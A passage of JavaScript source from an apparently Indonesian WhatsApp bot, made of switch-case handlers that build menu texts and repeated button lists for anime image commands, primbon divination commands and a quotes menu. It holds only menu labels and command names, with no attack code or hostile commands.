        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'animebutton': {
let teks =`╭⊣「 *\`乂 ᴍᴇɴᴜ ᴀɴɪᴍᴇ 乂\`* 」⊢▤
║◦ *${prefix}akira*
║◦ *${prefix}akiyama*
║◦ *${prefix}ana*
║◦ *${prefix}asuna*
║◦ *${prefix}ayuzawa*
║◦ *${prefix}boruto*
║◦ *${prefix}chiho*
║◦ *${prefix}chitoge*
║◦ *${prefix}cosplayloli*
║◦ *${prefix}cosplaysagiri*
║◦ *${prefix}deidara*
║◦ *${prefix}doraemon*
║◦ *${prefix}elaina*
║◦ *${prefix}emilia*
║◦ *${prefix}erza*
║◦ *${prefix}gremory*
║◦ *${prefix}hestia*
║◦ *${prefix}hinata*
║◦ *${prefix}husbu*
║◦ *${prefix}inori*
║◦ *${prefix}isuzu*
║◦ *${prefix}itachi*
║◦ *${prefix}itori*
║◦ *${prefix}kaga*
║◦ *${prefix}kagura*
║◦ *${prefix}kakasih*
║◦ *${prefix}kaori*
║◦ *${prefix}keneki*
║◦ *${prefix}kotori*
║◦ *${prefix}kurumi*
║◦ *${prefix}loli*
║◦ *${prefix}madara*
║◦ *${prefix}megumin*
║◦ *${prefix}mikasa*
║◦ *${prefix}mikey*
║◦ *${prefix}miku*
║◦ *${prefix}minato*
║◦ *${prefix}naruto*
║◦ *${prefix}neko*
║◦ *${prefix}neko2*
║◦ *${prefix}nekonime*
║◦ *${prefix}nezuko*
║◦ *${prefix}onepiece*
║◦ *${prefix}pokemon*
║◦ *${prefix}randomnime*
║◦ *${prefix}randomnime2*
║◦ *${prefix}rize*
║◦ *${prefix}sagiri*
║◦ *${prefix}sakura*
║◦ *${prefix}sasuke*
║◦ *${prefix}shina*
║◦ *${prefix}shinka*
║◦ *${prefix}shinomiya*
║◦ *${prefix}shizuka*
║◦ *${prefix}shota*
║◦ *${prefix}tejina*
║◦ *${prefix}toukachan*
║◦ *${prefix}tsunade*
║◦ *${prefix}waifu*
║◦ *${prefix}animewall*
║◦ *${prefix}yotsuba*
║◦ *${prefix}yuki*
║◦ *${prefix}yulibocil*
║◦ *${prefix}yumeko*
║◦ *${prefix}8ball*
║◦ *${prefix}tickle*
║◦ *${prefix}gecg*
║◦ *${prefix}feed*
║◦ *${prefix}animeawoo*
║◦ *${prefix}animemegumin*
║◦ *${prefix}animeshinobu*
║◦ *${prefix}animehandhold*
║◦ *${prefix}animehighfive*
║◦ *${prefix}animecringe*
║◦ *${prefix}animedance*
║◦ *${prefix}animehappy*
║◦ *${prefix}animeglomp*
║◦ *${prefix}animeblush*
║◦ *${prefix}animesmug*
║◦ *${prefix}animewave*
║◦ *${prefix}animesmile*
║◦ *${prefix}animepoke*
║◦ *${prefix}animewink*
║◦ *${prefix}animebonk*
║◦ *${prefix}animebully*
║◦ *${prefix}animeyeet*
║◦ *${prefix}animebite*
║◦ *${prefix}animelick*
║◦ *${prefix}animekill*
║◦ *${prefix}animecry*
║◦ *${prefix}animewlp*
║◦ *${prefix}animekiss*
║◦ *${prefix}animehug*
║◦ *${prefix}animeneko*
║◦ *${prefix}animepat*
║◦ *${prefix}animeslap*
║◦ *${prefix}animecuddle*
║◦ *${prefix}animewaifu*
║◦ *${prefix}animenom*
║◦ *${prefix}animefoxgirl*
║◦ *${prefix}animegecg*
║◦ *${prefix}animetickle*
║◦ *${prefix}animefeed*
║◦ *${prefix}animeavatar*
║◦ *${prefix}genshin*
║◦ *${prefix}anime*
║◦ *${prefix}amv*
╰━━━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'primbonmenubutton': {
let teks =`◤─「 \`PRIMBON MENU\` 」─✦
│⦿ 〔 _.artimimpi_
│⦿ 〔 _.artinama_
│⦿ 〔 _.ramaljodoh_
│⦿ 〔 _.ramaljodohbali_
│⦿ 〔 _.suamiistri_
│⦿ 〔 _.ramalcinta_
│⦿ 〔 _.cocoknama_
│⦿ 〔 _.pasangan_
│⦿ 〔 _.jadiannikah_
│⦿ 〔 _.sifatusaha_
│⦿ 〔 _.rezeki_
│⦿ 〔 _.pekerjaan_
│⦿ 〔 _.nasib_
│⦿ 〔 _.penyakit_
│⦿ 〔 _.tarot_
│⦿ 〔 _.fengshui_
│⦿ 〔 _.haribaik_
│⦿ 〔 _.harisangar_
│⦿ 〔 _.harisial_
│⦿ 〔 _.nagahari_
│⦿ 〔 _.arahrezeki_
│⦿ 〔 _.peruntungan_
│⦿ 〔 _.weton_
│⦿ 〔 _.karakter_
│⦿ 〔 _.keberuntungan_
│⦿ 〔 _.memancing_
│⦿ 〔 _.masasubur_
│⦿ 〔 _.zodiak_
│⦿ 〔 _.shio_
◣──────────❈`
const bet = {
    title: "LIST MENU",
    sections: [
  {
    title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`,
    highlight_label: `🔥ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        header: "🧭 All Menu",
        title: "🗂️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴍᴇɴᴜ ᴀʟʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.allmenu`, 
      },
    ],
  },
  {
    title: `ᴍɪɴᴇᴄʀᴀғᴛ sᴛᴀᴛᴜs ғɪᴛᴜʀ`,
    highlight_label: ``,
    rows: [
      {
        header: "⛏️ MC Status",
        title: "🧱 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.mcstatus`, 
      },
    ],
  },
  {
    title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`,
    highlight_label: `🛠️ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
    rows: [
      {
        header: "🆕 New Updates",
        title: "📢 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ᴛᴇʀʙᴀʀᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.newupdatebutton`, 
      },
      {
        header: "🛠️ Fix Fitur",
        title: "🧩 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ ᴅɪғɪx",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.fixbutton`, 
      },
      {
        header: "🛍 Shop menu",
        title: "📦 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ sʜᴏᴘᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.shopmenubutton`, 
      },
      {
        header: "⚡ Cpanel menu",
        title: "🛒 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ꜰɪᴛᴜʀ ᴄʀᴇᴀᴛᴇ ᴘᴀɴᴇʟ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.cpanelbutton`, 
      },
    ],
  },
  {
    title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`,
    highlight_label: ``,
    rows: [
      {
        header: "📜 Peraturan",
        title: "⚖️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴜʟᴇs ʙᴏᴛ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.bacaperaturanbutton`, 
      },
      {
        header: "🎁 Donasi",
        title: "💖 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏɴᴀsɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.donasibutton`, 
      },
      {
        header: "🤖 AI Menu",
        title: "✨ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀɪ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.aimenubutton`, 
      },
      {
        header: "🎉 Fun Menu",
        title: "🤣 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ғᴜɴ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.funmenubutton`, 
      },
      {
        header: "🕹️ RPG Menu",
        title: "⚔️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ʀᴘɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.rpgmenubutton`, 
      },
      {
        header: "📤 Push Menu",
        title: "📨 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴘᴜsʜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.pushmenubutton`, 
      },
      {
        header: "🎥 Asupan Menu",
        title: "🥤 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴀsᴜᴘᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.nsfwmenubutton`, 
      },
      {
        header: "🧩 Game Menu",
        title: "🎮 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ɢᴀᴍᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.gamemenubutton`, 
      },
      {
        header: "🛍️ Store Menu",
        title: "🛒 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴏʀᴇ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.storemenubutton`, 
      },
      {
        header: "🎌 Anime Menu",
        title: "📺 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ᴀɴɪᴍᴇ ᴘᴀɴᴇʟ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.animebutton`, 
      },
      {
        header: "🌀 Other Menu",
        title: "🧃 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴛᴀᴍʙᴀʜᴀɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.othermenubutton`, 
      },
      {
        header: "⚙️ Owner Menu",
        title: "👑 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ownermenubutton`, 
      },
      {
        header: "🫂 Grup Menu",
        title: "👥 ᴜɴᴛᴜᴋ ᴍᴇɴɪʜᴀᴛ ʟɪsᴛ ɢʀᴜᴘ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.groupmenubutton`, 
      },
      {
        header: "🕌 Islamic Menu",
        title: "📿 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.islamimenubutton`, 
      },
      {
        header: "📰 Berita Menu",
        title: "🗞️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.beritamenubutton`, 
      },
      {
        header: "✨ Quotes Menu",
        title: "📝 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.quotesmenubutton`, 
      },
      {
        header: "🖼️ Sticker Menu",
        title: "💬 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stickermenubutton`, 
      },
      {
        header: "🔍 Stalking Menu",
        title: "🧿 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ sᴛᴀʟᴋɪɴɢ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.stalkermenubutton`, 
      },
      {
        header: "🔮 Primbon Menu",
        title: "🕯️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.primbonmenubutton`, 
      },
      {
        header: "🎖️ Certificate Menu",
        title: "📜 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.sertifikatmenubutton`, 
      },
      {
        header: "⬇️ Download Menu",
        title: "📥 ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.downloadmenubutton`, 
      },
      {
        header: "📸 Ephoto Menu",
        title: "🖌️ ᴜɴᴛᴜᴋ ᴍᴇʟɪʜᴀᴛ ʟɪsᴛ ᴇᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.ephoto360menubutton`, 
      },
      {
        header: "🎭 Anonymous Menu",
        title: "🕵️‍♂️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.anonymousmenubutton`, 
      },
      {
        header: "🎲 Random Video",
        title: "📹 ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomvideomenubutton`, 
      },
      {
        header: "🎬 Random Photo",
        title: "🖼️ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
        description: "© ᴛʀᴀᴅᴢ | ᴅᴇᴠ",
        id: `.randomphotomenubutton`, 
      },
    ],
  },
  {
    title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`,
    highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
    rows: [
      {
        title: "🎗 ɪɴғᴏ ʙᴏᴛ",
        description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
        id: `.infobot`,
      },
      {
        title: "💫 ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
        id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'quotesmenubutton': {
let teks =`◤─「 \`QUOTES MENU\` 」─✦
│⦿ 〔 _.quotesanime_ 
│⦿ 〔 _.quotesbacot_ 
│⦿ 〔 _.quotesbucin_ 
│⦿ 〔 _.quotesmotivasi_ 
